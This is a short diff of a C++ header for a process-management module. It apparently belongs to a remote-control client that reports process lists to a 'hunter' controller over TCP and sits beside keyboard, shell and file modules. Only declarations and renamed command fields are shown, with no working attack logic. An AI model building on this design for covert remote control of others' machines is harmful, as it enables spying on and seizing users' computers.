@@ -7,6 +7,7 @@
 #include <string>
 #include <map>
 #include <vector>
+#include <strsafe.h>
 
 class Proc
 {
@@ -18,13 +19,12 @@ public:
 	std::string CmdFreshProcs;           // 刷新进程列表
 	std::string CmdDeleteProc;           // 删除进程
 	// 食物发送至hunter
-	std::string CmdSendProcs;            // 发送当前所有进程信息
+	std::string CmdSendProc;            // 发送一个进程信息
 	std::string CmdKillProcSuccess;      // kill进程成功
 	std::string CmdKillProcFailed;       // kill进程失败
 	// 分割与结束符
 	std::string CmdSplit;
 	std::string CmdEnd;
-	std::string CmdFileSplit;
 	// ------------------------------定义进程管理命令(完)--------------------------------
 
 	// 此类入口函数 跟Keybd和shell还有File模块形式差不多
@@ -40,5 +40,6 @@ public:
 	// 几个命令处理函数
 	static void doFreshProcs(TcpSocket* sock, std::map<std::string, std::string>& args);
 	static void doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args);
+
 };
 
